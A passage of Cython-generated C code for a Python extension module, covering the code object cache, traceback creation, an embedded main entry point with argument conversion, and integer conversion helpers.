      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject *ptype, *pvalue, *ptraceback;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) {
            /* If the code object creation fails, then we should clear the
               fetched exception references and propagate the new exception */
            Py_XDECREF(ptype);
            Py_XDECREF(pvalue);
            Py_XDECREF(ptraceback);
            goto bad;
        }
        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}

/* MainFunction */
#ifdef __FreeBSD__
#include <floatingpoint.h>
#endif
#if PY_MAJOR_VERSION < 3
int main(int argc, char** argv) {
#elif defined(WIN32) || defined(MS_WINDOWS)
int wmain(int argc, wchar_t **argv) {
#else
static int __Pyx_main(int argc, wchar_t **argv) {
#endif
    /* 754 requires that FP exceptions run in "no stop" mode by default,
     * and until C vendors implement C99's ways to control FP exceptions,
     * Python requires non-stop mode.  Alas, some platforms enable FP
     * exceptions by default.  Here we disable them.
     */
#ifdef __FreeBSD__
    fp_except_t m;
    m = fpgetmask();
    fpsetmask(m & ~FP_X_OFL);
#endif
    if (argc && argv)
        Py_SetProgramName(argv[0]);
    Py_Initialize();
    if (argc && argv)
        PySys_SetArgv(argc, argv);
    {
      PyObject* m = NULL;
      __pyx_module_is_main_source = 1;
      #if PY_MAJOR_VERSION < 3
          initsource();
      #elif CYTHON_PEP489_MULTI_PHASE_INIT
          m = PyInit_source();
          if (!PyModule_Check(m)) {
              PyModuleDef *mdef = (PyModuleDef *) m;
              PyObject *modname = PyUnicode_FromString("__main__");
              m = NULL;
              if (modname) {
                  m = PyModule_NewObject(modname);
                  Py_DECREF(modname);
                  if (m) PyModule_ExecDef(m, mdef);
              }
          }
      #else
          m = PyInit_source();
      #endif
      if (PyErr_Occurred()) {
          PyErr_Print();
          #if PY_MAJOR_VERSION < 3
          if (Py_FlushLine()) PyErr_Clear();
          #endif
          return 1;
      }
      Py_XDECREF(m);
    }
#if PY_VERSION_HEX < 0x03060000
    Py_Finalize();
#else
    if (Py_FinalizeEx() < 0)
        return 2;
#endif
    return 0;
}
#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)
#include <locale.h>
static wchar_t*
__Pyx_char2wchar(char* arg)
{
    wchar_t *res;
#ifdef HAVE_BROKEN_MBSTOWCS
    /* Some platforms have a broken implementation of
     * mbstowcs which does not count the characters that
     * would result from conversion.  Use an upper bound.
     */
    size_t argsize = strlen(arg);
#else
    size_t argsize = mbstowcs(NULL, arg, 0);
#endif
    size_t count;
    unsigned char *in;
    wchar_t *out;
#ifdef HAVE_MBRTOWC
    mbstate_t mbs;
#endif
    if (argsize != (size_t)-1) {
        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));
        if (!res)
            goto oom;
        count = mbstowcs(res, arg, argsize+1);
        if (count != (size_t)-1) {
            wchar_t *tmp;
            /* Only use the result if it contains no
               surrogate characters. */
            for (tmp = res; *tmp != 0 &&
                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)
                ;
            if (*tmp == 0)
                return res;
        }
        free(res);
    }
#ifdef HAVE_MBRTOWC
    /* Overallocate; as multi-byte characters are in the argument, the
       actual output could use less memory. */
    argsize = strlen(arg) + 1;
    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    memset(&mbs, 0, sizeof mbs);
    while (argsize) {
        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);
        if (converted == 0)
            break;
        if (converted == (size_t)-2) {
            /* Incomplete character. This should never happen,
               since we provide everything that we have -
               unless there is a bug in the C library, or I
               misunderstood how mbrtowc works. */
            fprintf(stderr, "unexpected mbrtowc result -2\\n");
            free(res);
            return NULL;
        }
        if (converted == (size_t)-1) {
            /* Conversion error. Escape as UTF-8b, and start over
               in the initial shift state. */
            *out++ = 0xdc00 + *in++;
            argsize--;
            memset(&mbs, 0, sizeof mbs);
            continue;
        }
        if (*out >= 0xd800 && *out <= 0xdfff) {
            /* Surrogate character.  Escape the original
               byte sequence with surrogateescape. */
            argsize -= converted;
            while (converted--)
                *out++ = 0xdc00 + *in++;
            continue;
        }
        in += converted;
        argsize -= converted;
        out++;
    }
#else
    /* Cannot use C locale for escaping; manually escape as if charset
       is ASCII (i.e. escape all bytes > 128. This will still roundtrip
       correctly in the locale's charset, which must be an ASCII superset. */
    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    while(*in)
        if(*in < 128)
            *out++ = *in++;
        else
            *out++ = 0xdc00 + *in++;
    *out = 0;
#endif
    return res;
oom:
    fprintf(stderr, "out of memory\\n");
    return NULL;
}
int
main(int argc, char **argv)
{
    if (!argc) {
        return __Pyx_main(0, NULL);
    }
    else {
        int i, res;
        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        char *oldloc = strdup(setlocale(LC_ALL, NULL));
        if (!argv_copy || !argv_copy2 || !oldloc) {
            fprintf(stderr, "out of memory\\n");
            free(argv_copy);
            free(argv_copy2);
            free(oldloc);
            return 1;
        }
        res = 0;
        setlocale(LC_ALL, "");
        for (i = 0; i < argc; i++) {
            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);
            if (!argv_copy[i]) res = 1;
        }
        setlocale(LC_ALL, oldloc);
        free(oldloc);
        if (res == 0)
            res = __Pyx_main(argc, argv_copy);
        for (i = 0; i < argc; i++) {
#if PY_VERSION_HEX < 0x03050000
            free(argv_copy2[i]);
#else
            PyMem_RawFree(argv_copy2[i]);
#endif
        }
        free(argv_copy);
        free(argv_copy2);
        return res;
    }
}
#endif

/* CIntFromPyVerify */
    #define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntFromPy */
    static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntToPy */
    static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

/* GetAttr */
    static CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *o, PyObject *n) {
#if CYTHON_USE_TYPE_SLOTS
#if PY_MAJOR_VERSION >= 3
    if (likely(PyUnicode_Check(n)))
#else
    if (likely(PyString_Check(n)))
#endif
        return __Pyx_PyObject_GetAttrStr(o, n);
#endif
    return PyObject_GetAttr(o, n);
}

/* Globals */
    static PyObject* __Pyx_Globals(void) {
    Py_ssize_t i;
    PyObject *names;
    PyObject *globals = __pyx_d;
    Py_INCREF(globals);
    names = PyObject_Dir(__pyx_m);
    if (!names)
        goto bad;
    for (i = PyList_GET_SIZE(names)-1; i >= 0; i--) {
#if CYTHON_COMPILING_IN_PYPY
        PyObject* name = PySequence_ITEM(names, i);
        if (!name)
            goto bad;
#else
        PyObject* name = PyList_GET_ITEM(names, i);
#endif
        if (!PyDict_Contains(globals, name)) {
            PyObject* value = __Pyx_GetAttr(__pyx_m, name);
            if (!value) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                goto bad;
            }
            if (PyDict_SetItem(globals, name, value) < 0) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                Py_DECREF(value);
                goto bad;
            }
        }
#if CYTHON_COMPILING_IN_PYPY
        Py_DECREF(name);
#endif
    }
    Py_DECREF(names);
    return globals;
bad:
    Py_XDECREF(names);
    Py_XDECREF(globals);
    return NULL;
}

/* CIntFromPy */
    static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
